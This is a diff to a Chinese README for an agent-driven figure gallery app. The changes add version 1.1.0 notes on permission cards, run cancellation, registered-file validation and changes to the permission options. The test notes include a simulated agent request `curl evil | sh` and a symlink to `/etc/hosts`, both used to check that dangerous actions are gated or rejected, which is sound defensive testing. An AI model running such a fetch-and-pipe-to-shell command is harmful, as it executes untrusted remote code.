@@ -33,16 +33,19 @@
 - 用真实 Agent 运行验证过：从画廊新建作品的完整流程（两件作品，其中一件的运行记录和会话都确认实际使用了所选的 MiniMax-M3.1-Flash-Preview）、一次登记出第二版的修改运行、通过 `register_figure_version` 登记、“过程”标签、模型显示名。
 - 在真实运行时验证过（不涉及 Agent 运行）：展区（新建、改名、排序、移动作品、移除展区、内置展区不能移除）、导入、切换版本、明暗版本、浅色和深色主题、侧栏窄宽度布局。控制台和网络请求没有报错。
 - 自带技能：把 `HOME` 指向空目录后解析技能，画廊在指令和示例里都选用了自带副本；把自带副本复制出来能构建 `examples/dial-indicator`。
+- 权限卡片和取消运行（1.1.0）：在页面上用一个模拟 Agent（`run` / `reply` 契约与宿主相同）验证。同一次运行里的两个请求（第二个是 `curl evil | sh`）都等到点击才回复，之前没有发出任何回复，第二个等了五分钟；点“允许”发出 `allowOnce`，点“拒绝”发出 `deny`；已在侧栏 MCode 卡片上处理过的请求，点画廊卡片时会提示并移除，过程记录里记为“已在对话里处理”；旧的 `/auto-allow` 接口返回 404，请求体里带 `autoAllow` 不起作用；Agent 停在权限请求上时取消运行，运行会终止，卡片随之清除。
+- 登记文件校验（1.1.0）：直接调用 `addVersion` 验证。真实的 PNG、JPEG、WebP 截图，以及指向 anatomy 页面的符号链接都被接受；链接到文本文件的 `.png`、内容是文本的 `.png`、链接到 `/etc/hosts` 的 `.html`、目录、不存在的文件和相对路径都被拒绝，被拒文件的内容不会进入 `dataDir`。
+- 尚未验证：真实 Agent 运行中的权限卡片、在侧栏回答 Agent 的提问、弹出窗口、在没装 anatomy 的机器上首次新建作品。
 
 ## 数据与访问
 
 - **状态**：画廊存的所有数据都在宿主提供的 `context.dataDir` 下：`gallery.json`（作品、版本、展区、运行记录）、`figures/<id>/v<n>/`（每个版本深浅两版页面和截图的副本）、`runs/<runId>.jsonl`（过程记录，每次运行最多 3000 条）。在画廊里撤下作品会删除这些副本和记录，不动 Agent 的源文件夹和关联对话。页面的 `localStorage` 只存主题选择。
 - **读取 `dataDir` 以外的文件**：
   - anatomy 技能。画廊按顺序在用户主目录下的固定位置查找独立安装的技能：`.minimax/skills/anatomy`、`.agents/skills/anatomy`、`.claude/skills/anatomy`、`.codex/skills/anatomy`、`.config/opencode/skills/anatomy`。这依赖未公开约定的目录布局。都没有 `SKILL.md` 时，用包里自带的副本。画廊会读取技能的示例和预览图用于展示，并把技能目录告诉 Agent。
-  - Agent 登记或你导入的页面：传给 `register_figure_version` 或填进“导入”的 HTML 绝对路径（以及截图），外加同目录的 `-light.html`。页面必须带有 anatomy 的 `class="iso"` 标记。画廊把它们复制进 `dataDir`，不写原文件。
+  - Agent 登记或你导入的页面：传给 `register_figure_version` 或填进“导入”的 HTML 绝对路径（以及截图），外加同目录的 `-light.html`。不限制所在文件夹，因为截图存在哪由 Agent 决定，技能自带示例的截图也在另一个文件夹。每个路径先用 `realpath` 解析，所有检查都针对真实文件：必须是普通文件；页面必须是 `.html`/`.htm`、不超过 30 MB、带有 anatomy 的 `class="iso"` 标记；截图必须是 PNG、JPEG 或 WebP 文件名、不超过 15 MB，并且文件头确实是 PNG、JPEG 或 WebP（存储格式按文件头确定）。通过检查的文件复制进 `dataDir`，不写原文件。
 - **写入 `dataDir` 以外的文件**：画廊本身不写。作品源文件由 Agent 写在宿主分配给画廊会话的工作目录里（见下条）。
 - **Agent 运行**（`agentAccess: ["session.run"]`）：每件作品用 `context.agent.create()` 创建一个隐藏会话。新建时，要求 Agent 在该工作目录的 `figures/<figureId>/` 下用 anatomy 做图，生成深浅两版页面和截图、完成校验，然后调用 `register_figure_version`。修改时，要求它只改这件作品的源文件夹（导入的作品改副本），再登记新版本。Agent 拥有正常的能力（文件、Shell、MCP）。Agent 的文字和日志只作为数据展示；画廊只根据 `register_figure_version` 收到并校验过的内容行事。Agent 的输出语言跟随你需求所用的语言。
-- **权限**：画廊发起的运行中，每个权限请求都以卡片展示，有“允许”“拒绝”“本次运行都允许”三个选项。你不点就不会放行。选了“本次运行都允许”后，同一次运行里后续的请求由画廊代你回复 `allowOnce`，运行结束即失效，下次运行重新询问。Agent 的提问在聊天侧栏里回答。
+- **权限**：画廊发起的运行中，每个权限请求都以卡片展示，有“允许”“拒绝”“去对话里批准”三个选项。画廊从不自己回复请求：“允许”“拒绝”只把你对这一个请求的点击转给宿主，你不点就一直等着。“去对话里批准”会把这件作品的对话打开到聊天侧栏，由 MCode 自己的权限卡片和权限模式开关来决定；“本对话全部允许”这类选项属于 MCode，不是画廊的功能。Agent 的提问在聊天侧栏里回答。
 - **MCP**：包里声明了一个由 Mini App 自己提供的 MCP 服务（`/mcp/anatomy-gallery`），有 `register_figure_version` 和 `list_figures` 两个工具。画廊运行期间，Agent 可以调用它们，普通对话里也可以。
 - **网络**：画廊的 Node 进程不发起任何外部请求。Agent 自己用工具时访问什么由 Agent 决定。
 - **进程**：画廊不启动任何进程。构建和截图校验在 Agent 的运行里进行。
